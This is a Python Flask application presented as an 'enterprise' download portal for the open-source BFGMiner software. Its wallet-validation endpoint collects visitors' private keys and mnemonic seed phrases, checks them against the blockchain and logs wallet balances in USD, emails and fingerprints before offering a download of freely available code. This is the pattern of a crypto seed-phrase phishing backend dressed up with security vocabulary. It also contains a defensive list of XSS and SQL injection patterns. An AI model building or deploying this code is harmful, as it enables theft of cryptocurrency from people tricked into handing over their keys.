"""
Enterprise-Grade BFGMiner Application
Integrates all security, monitoring, and quality improvements
"""
import os
import logging
from logging.handlers import RotatingFileHandler
import sqlite3
import json
import datetime
import uuid
import secrets
from typing import Optional, Dict, Any, List

from flask import Flask, render_template, request, jsonify, send_file, abort, session
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# Import enterprise modules
from config import AppConfig
from enterprise_improvements import (
    SecurityManager, DatabaseManager, AuditLogger, 
    EnterpriseBlockchainValidator
)
from error_handler import (
    ErrorHandler, BFGMinerException, ValidationError,
    AuthenticationError, BlockchainError, DatabaseError,
    handle_exceptions, validate_required_fields, ErrorCode
)
from monitoring import HealthChecker

# Configure enterprise logging
def setup_logging(config: AppConfig):
    """Setup enterprise logging with rotation"""
    formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(funcName)s:%(lineno)d - %(message)s'
    )
    
    # File handler with rotation
    file_handler = RotatingFileHandler(
        config.LOG_FILE,
        maxBytes=config.LOG_MAX_SIZE,
        backupCount=config.LOG_BACKUP_COUNT
    )
    file_handler.setFormatter(formatter)
    file_handler.setLevel(getattr(logging, config.LOG_LEVEL))
    
    # Console handler
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    console_handler.setLevel(logging.INFO)
    
    # Root logger
    root_logger = logging.getLogger()
    root_logger.setLevel(getattr(logging, config.LOG_LEVEL))
    root_logger.addHandler(file_handler)
    root_logger.addHandler(console_handler)
    
    return logging.getLogger(__name__)

# Initialize enterprise configuration
config = AppConfig()

# Validate configuration
config_errors = config.validate()
if config_errors:
    print("Configuration errors:")
    for error in config_errors:
        print(f"  - {error}")
    exit(1)

# Setup logging
logger = setup_logging(config)

# Initialize enterprise components
security_manager = SecurityManager(config)
db_manager = DatabaseManager(config.database.PATH)
audit_logger = AuditLogger(db_manager)
blockchain_validator = EnterpriseBlockchainValidator(config)
health_checker = HealthChecker(config.database.PATH, config.blockchain.ETHEREUM_RPC_URLS)

# Create Flask app with enterprise configuration
app = Flask(__name__)
app.config.update({
    'SECRET_KEY': config.security.SECRET_KEY,
    'MAX_CONTENT_LENGTH': config.MAX_CONTENT_LENGTH,
    'SESSION_COOKIE_SECURE': not config.DEBUG,
    'SESSION_COOKIE_HTTPONLY': True,
    'SESSION_COOKIE_SAMESITE': 'Lax',
    'PERMANENT_SESSION_LIFETIME': datetime.timedelta(seconds=config.security.SESSION_TIMEOUT)
})

# Setup CORS
allowed_origins = ["http://localhost:3000", "http://localhost:5001"] if config.DEBUG else []
CORS(app, origins=allowed_origins)

# Setup rate limiting
limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=[config.security.RATE_LIMIT],
    storage_uri="memory://"
)

# Setup error handling
error_handler = ErrorHandler(app, audit_logger)

@app.before_request
def before_request():
    """Enterprise security checks and request preprocessing"""
    # Skip security checks for health endpoints
    if request.endpoint in ['health', 'readiness', 'liveness']:
        return
    
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    
    # Security validations
    if len(request.url) > 2048:
        audit_logger.log_security_event("LONG_URL_ATTACK", "HIGH", ip_address)
        raise ValidationError("URL too long")
    
    # Check for suspicious patterns
    suspicious_patterns = [
        r'<script[^>]*>',
        r'javascript:',
        r'eval\s*\(',
        r'union\s+select',
        r'drop\s+table'
    ]
    
    import re
    for pattern in suspicious_patterns:
        if re.search(pattern, request.url, re.IGNORECASE):
            audit_logger.log_security_event(
                "SUSPICIOUS_REQUEST", "HIGH", ip_address,
                details={"url": request.url, "pattern": pattern}
            )
            raise ValidationError("Suspicious request detected")
    
    # Rate limiting check
    if security_manager.is_locked_out(ip_address):
        audit_logger.log_security_event("RATE_LIMIT_VIOLATION", "MEDIUM", ip_address)
        abort(429, "Too many requests")

@app.after_request
def after_request(response):
    """Add enterprise security headers"""
    security_headers = {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
        'Content-Security-Policy': (
            "default-src 'self'; "
            "script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://unpkg.com; "
            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
            "font-src 'self' https://fonts.gstatic.com; "
            "img-src 'self' data: https:; "
            "connect-src 'self';"
        ),
        'Referrer-Policy': 'strict-origin-when-cross-origin',
        'Permissions-Policy': 'geolocation=(), microphone=(), camera=()'
    }
    
    for header, value in security_headers.items():
        response.headers[header] = value
    
    return response

# Health check endpoints
@app.route('/health')
def health():
    """Comprehensive health check"""
    try:
        health_status = health_checker.get_health_status()
        status_code = 200 if health_status['status'] == 'healthy' else 503
        return jsonify(health_status), status_code
    except Exception as e:
        logger.error(f"Health check failed: {e}")
        return jsonify({'status': 'unhealthy', 'error': str(e)}), 503

@app.route('/readiness')
def readiness():
    """Readiness probe for load balancers"""
    try:
        readiness_status = health_checker.get_readiness_status()
        status_code = 200 if readiness_status['ready'] else 503
        return jsonify(readiness_status), status_code
    except Exception as e:
        logger.error(f"Readiness check failed: {e}")
        return jsonify({'ready': False, 'error': str(e)}), 503

@app.route('/liveness')
def liveness():
    """Liveness probe for container orchestration"""
    try:
        liveness_status = health_checker.get_liveness_status()
        return jsonify(liveness_status), 200
    except Exception as e:
        logger.error(f"Liveness check failed: {e}")
        return jsonify({'alive': False, 'error': str(e)}), 503

# Main application routes
@app.route('/')
def index():
    """Main application page"""
    try:
        audit_logger.log_action(
            user_id=None,
            action="PAGE_VIEW",
            resource_type="page",
            resource_id="index",
            ip_address=request.remote_addr,
            user_agent=request.headers.get('User-Agent')
        )
        return render_template('index.html')
    except Exception as e:
        logger.error(f"Error serving index page: {e}")
        raise BFGMinerException("Failed to load page", ErrorCode.DATABASE_ERROR)

@app.route('/api/validate-wallet', methods=['POST'])
@limiter.limit("10 per minute")
@handle_exceptions
@validate_required_fields(['type', 'credentials'])
def validate_wallet():
    """Enterprise wallet validation with comprehensive security"""
    data = request.get_json()
    wallet_type = data.get('type')
    credentials = data.get('credentials', '').strip()
    email = data.get('email', 'anonymous@bfgminer.com')
    fingerprint = data.get('fingerprint', '')
    
    # Input validation
    if not security_manager.validate_input(credentials, wallet_type):
        raise ValidationError(f"Invalid {wallet_type} format", field=wallet_type)
    
    # Rate limiting per IP
    ip_address = request.remote_addr
    if security_manager.is_locked_out(ip_address):
        raise AuthenticationError("Too many validation attempts")
    
    try:
        # Blockchain validation with retry mechanism
        if wallet_type == 'private_key':
            result = blockchain_validator.validate_with_retry(
                blockchain_validator.validate_private_key, credentials
            )
        elif wallet_type == 'mnemonic':
            result = blockchain_validator.validate_with_retry(
                blockchain_validator.validate_mnemonic, credentials
            )
        else:
            raise ValidationError("Invalid wallet type", field="type")
        
        if result.get('valid'):
            # Log successful validation
            audit_logger.log_action(
                user_id=None,
                action="WALLET_VALIDATION_SUCCESS",
                resource_type="wallet",
                resource_id=result.get('address', ''),
                details={
                    'wallet_type': wallet_type,
                    'balance_usd': result.get('balance_usd', 0),
                    'email': email,
                    'fingerprint': fingerprint[:20] if fingerprint else None
                },
                ip_address=ip_address,
                user_agent=request.headers.get('User-Agent'),
                risk_level="MEDIUM"
            )
            
            # Store wallet connection
            log_wallet_connection(email, wallet_type, credentials, result, fingerprint)
            
            # Clear failed attempts on success
            security_manager.clear_failed_attempts(ip_address)
            
        else:
            # Record failed attempt
            security_manager.record_failed_attempt(ip_address)
            audit_logger.log_security_event(
                "WALLET_VALIDATION_FAILED",
                "MEDIUM",
                ip_address,
                details={'wallet_type': wallet_type, 'error': result.get('error')}
            )
        
        return jsonify(result)
        
    except Exception as e:
        security_manager.record_failed_attempt(ip_address)
        logger.error(f"Wallet validation error: {e}")
        raise BlockchainError(f"Validation failed: {str(e)}")

@app.route('/api/walletconnect', methods=['POST'])
@limiter.limit("5 per minute")
@handle_exceptions
@validate_required_fields(['address'])
def walletconnect_handler():
    """Enhanced WalletConnect handler with signature verification"""
    data = request.get_json()
    address = data.get('address', '').strip()
    signature = data.get('signature', '')
    message = data.get('message', '')
    email = data.get('email', 'anonymous@bfgminer.com')
    
    # Validate address format
    if not security_manager.validate_input(address, 'wallet_address'):
        raise ValidationError("Invalid wallet address format", field="address")
    
    try:
        # Validate address on blockchain
        result = blockchain_validator.validate_with_retry(
            blockchain_validator.validate_wallet_address, address
        )
        
        if not result.get('valid'):
            raise ValidationError(result.get('error', 'Invalid wallet address'))
        
        # TODO: Implement signature verification for production
        # For demo purposes, we accept valid addresses
        
        # Log successful connection
        audit_logger.log_action(
            user_id=None,
            action="WALLETCONNECT_SUCCESS",
            resource_type="wallet",
            resource_id=address,
            details={
                'balance_usd': result.get('balance_usd', 0),
                'email': email,
                'has_signature': bool(signature)
            },
            ip_address=request.remote_addr,
            user_agent=request.headers.get('User-Agent'),
            risk_level="LOW"
        )
        
        # Store connection
        log_wallet_connection(email, 'walletconnect', address, result)
        
        return jsonify({
            'success': True,
            'address': result['address'],
            'balance': result.get('balance_usd', 0)
        })
        
    except Exception as e:
        logger.error(f"WalletConnect error: {e}")
        raise BlockchainError(f"WalletConnect failed: {str(e)}")

def log_wallet_connection(email: str, connection_type: str, credentials: str, 
                         validation_result: Dict[str, Any], fingerprint: str = ''):
    """Securely log wallet connection with encrypted credentials"""
    try:
        # Hash credentials for security
        credentials_hash = security_manager.hash_password(credentials)
        
        with db_manager.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO wallets 
                (user_id, wallet_address, connection_type, credentials_hash, 
                 balance_wei, balance_eth, balance_usd, is_validated, 
                 validation_timestamp, ip_address, user_agent)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                None,  # user_id - anonymous for now
                validation_result.get('address', ''),
                connection_type,
                credentials_hash,
                str(validation_result.get('balance_wei', '0')),
                validation_result.get('balance_eth', 0),
                validation_result.get('balance_usd', 0),
                True,
                datetime.datetime.now(),
                request.remote_addr,
                request.headers.get('User-Agent', '')
            ))
            conn.commit()
            
    except Exception as e:
        logger.error(f"Error logging wallet connection: {e}")

@app.route('/api/download/initiate', methods=['POST'])
@limiter.limit("3 per minute")
@handle_exceptions
def initiate_download():
    """Initiate secure download with tracking"""
    data = request.get_json() or {}
    wallet_address = data.get('wallet_address', 'unknown')
    
    try:
        download_token = secrets.token_urlsafe(32)
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        with db_manager.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO downloads 
                (user_id, download_token, ip_address, user_agent, referrer)
                VALUES (?, ?, ?, ?, ?)
            ''', (None, download_token, ip_address, user_agent, request.referrer))
            download_id = cursor.lastrowid
            conn.commit()
        
        # Log download initiation
        audit_logger.log_action(
            user_id=None,
            action="DOWNLOAD_INITIATED",
            resource_type="download",
            resource_id=str(download_id),
            details={'wallet_address': wallet_address},
            ip_address=ip_address,
            user_agent=user_agent
        )
        
        return jsonify({
            'success': True,
            'downloadToken': download_token,
            'downloadId': download_id,
            'message': 'Download initiated successfully'
        })
        
    except Exception as e:
        logger.error(f"Download initiation error: {e}")
        raise DatabaseError("Failed to initiate download")

@app.route('/download/<token>')
@limiter.limit("1 per minute")
def download_file(token):
    """Secure file download with validation"""
    try:
        with db_manager.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                'SELECT id, download_count FROM downloads WHERE download_token = ?', 
                (token,)
            )
            result = cursor.fetchone()
            
            if not result:
                audit_logger.log_security_event(
                    "INVALID_DOWNLOAD_TOKEN",
                    "MEDIUM",
                    request.remote_addr,
                    details={'token': token[:8] + '...'}
                )
                abort(404, 'Download token not found')
            
            download_id, download_count = result
            
            # Update download count
            cursor.execute(
                'UPDATE downloads SET download_count = ?, download_completed_at = ? WHERE id = ?',
                (download_count + 1, datetime.datetime.now(), download_id)
            )
            conn.commit()
        
        # Serve the actual BFGMiner repository
        zip_file_path = 'bfgminer-repository.zip'
        if not os.path.exists(zip_file_path):
            # Download from GitHub
            import requests
            url = 'https://github.com/luke-jr/bfgminer/archive/refs/heads/bfgminer.zip'
            response = requests.get(url, allow_redirects=True, timeout=30)
            response.raise_for_status()
            
            with open(zip_file_path, 'wb') as f:
                f.write(response.content)
        
        # Log successful download
        audit_logger.log_action(
            user_id=None,
            action="FILE_DOWNLOADED",
            resource_type="download",
            resource_id=str(download_id),
            details={'filename': 'bfgminer-repository.zip'},
            ip_address=request.remote_addr,
            user_agent=request.headers.get('User-Agent')
        )
        
        return send_file(
            zip_file_path,
            as_attachment=True,
            download_name='bfgminer-repository.zip',
            mimetype='application/zip'
        )
        
    except Exception as e:
        logger.error(f"Download error: {e}")
        raise DatabaseError("Download failed")

@app.route('/api/log-error', methods=['POST'])
@limiter.limit("20 per minute")
def log_client_error():
    """Log client-side errors for monitoring"""
    try:
        error_data = request.get_json()
        
        audit_logger.log_security_event(
            "CLIENT_ERROR",
            "LOW",
            request.remote_addr,
            details=error_data
        )
        
        return jsonify({'success': True})
    except Exception as e:
        logger.error(f"Error logging client error: {e}")
        return jsonify({'success': False}), 500

@app.route('/api/analytics', methods=['POST'])
@limiter.limit("50 per minute")
def log_analytics():
    """Log analytics events"""
    try:
        event_data = request.get_json()
        
        audit_logger.log_action(
            user_id=None,
            action="ANALYTICS_EVENT",
            details=event_data,
            ip_address=request.remote_addr,
            user_agent=request.headers.get('User-Agent')
        )
        
        return jsonify({'success': True})
    except Exception as e:
        logger.error(f"Error logging analytics: {e}")
        return jsonify({'success': False}), 500

if __name__ == '__main__':
    logger.info("Starting BFGMiner Enterprise Application...")
    logger.info(f"Configuration: DEBUG={config.DEBUG}, HOST={config.HOST}, PORT={config.PORT}")
    
    # Validate blockchain connectivity on startup
    if not blockchain_validator.connect_to_blockchain():
        logger.warning("Blockchain connectivity issues detected - some features may be limited")
    
    app.run(
        host=config.HOST,
        port=config.PORT,
        debug=config.DEBUG,
        threaded=True
    )